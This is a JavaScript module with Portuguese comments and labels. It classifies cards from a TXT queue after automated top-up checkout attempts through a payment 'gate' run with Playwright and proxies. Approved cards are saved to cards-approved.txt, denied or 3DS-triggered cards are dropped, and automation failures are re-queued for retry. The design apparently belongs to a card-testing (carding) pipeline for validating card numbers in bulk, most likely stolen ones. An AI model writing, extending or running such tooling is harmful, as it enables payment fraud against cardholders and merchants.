/** Classifica o que fazer com o cartão da fila TXT após a recarga. */

export function classifyCardListAction({ outcome, error } = {}) {
  if (error) {
    const msg = String(error?.message ?? error);
    if (isAutomationFailureMessage(msg)) return 'return';
    if (isGateDenialMessage(msg)) return 'consumed';
    return 'return';
  }

  const result = outcome?.result ?? {};
  const status = String(result.status ?? '').toUpperCase();
  const raw = outcome?.automation?.raw ?? {};
  const rawStatus = String(raw.status ?? '').toLowerCase();
  const gateCode = String(raw.gateCode ?? result.gateCode ?? '').toUpperCase();
  const msg = String(
    result.negativeReason ?? result.message ?? raw.gateMessage ?? raw.message ?? '',
  );

  if (status === 'CONFIRMED' || status === 'SUCCESS') return 'approved';
  if (rawStatus === 'success') return 'approved';

  if (status === '3DS_REQUIRED' || rawStatus === '3ds_required') return 'consumed';

  const bodyDenied = paymentBodyIsDenied(raw.gateResponse?.body);
  const explicitDenied =
    status === 'DENIED' ||
    status === 'REJECTED' ||
    status === 'FAILURE' ||
    gateCode === 'DENIED' ||
    rawStatus === 'denied';

  if (explicitDenied || bodyDenied || isGateDenialMessage(msg)) {
    if (isAutomationFailureMessage(msg) && !bodyDenied && gateCode !== 'DENIED') {
      return 'return';
    }
    return 'consumed';
  }

  if (status === 'TIMEOUT' || rawStatus === 'timeout') return 'return';
  if (status === 'AUTOMATION_FAIL' || rawStatus === 'error_manual') return 'return';
  if (isAutomationFailureMessage(msg)) return 'return';

  return 'return';
}

export function isGateDenialMessage(msg) {
  return /negad|denied|recusad|n[aã]o autoriz|bloqueado|insuficiente|saldo insuficiente|cart[aã]o inv[aá]lido|transa[cç][aã]o negada|operadora recusou|fraud|fraude|suspeit|CREDIT_CARD\s*-\s*422|n[aã]o foi poss[ií]vel concluir|n[aã]o conseguimos (processar|realizar)|compra n[aã]o conclu[ií]da|informe c[oó]digo\s*\d+/i.test(
    String(msg),
  );
}

export function isAutomationFailureMessage(msg) {
  return /formul[aá]rio\s+pan|pan n[aã]o abriu|n[aã]o hidrat|n[aã]o capturado|iframe|element|locator|click|limite de \d+ telas|timeout|timed?\s*out|automa[cç][aã]o(\s+http)?|paminfo|error_manual|sess[aã]o|manual|playwright|browser|proxy|fetch failed|net::|econnreset|etimedout|navigation|target closed|page\.goto|page closed|hidrat|checkout pode estar/i.test(
    String(msg),
  );
}

export function paymentBodyIsDenied(body) {
  if (!body || typeof body !== 'object') return false;
  const st = String(
    body.status ?? body.payments?.[0]?.status ?? body.tags?.transaction?.status ?? '',
  ).toUpperCase();
  if (st === 'DENIED' || st === 'REJECTED' || st === 'FAILURE') return true;
  if (Array.isArray(body) && body[0]?.status === 'nok') return true;
  return false;
}

export function cardListActionLabel(action, { outcome } = {}) {
  if (action === 'approved') return '✅ aprovado → salvo em cards-approved.txt';
  if (action === 'consumed') {
    const st = String(outcome?.result?.status ?? '').toUpperCase();
    const rawSt = String(outcome?.automation?.raw?.status ?? '').toLowerCase();
    if (st === '3DS_REQUIRED' || rawSt === '3ds_required') {
      return '🔐 3DS acionado → removido da fila (não reutilizar)';
    }
    return '🚫 negado na gate → removido da fila';
  }
  if (action === 'return') return '↩️ falha (não foi a gate) → cartão voltou pra fila';
  return '';
}
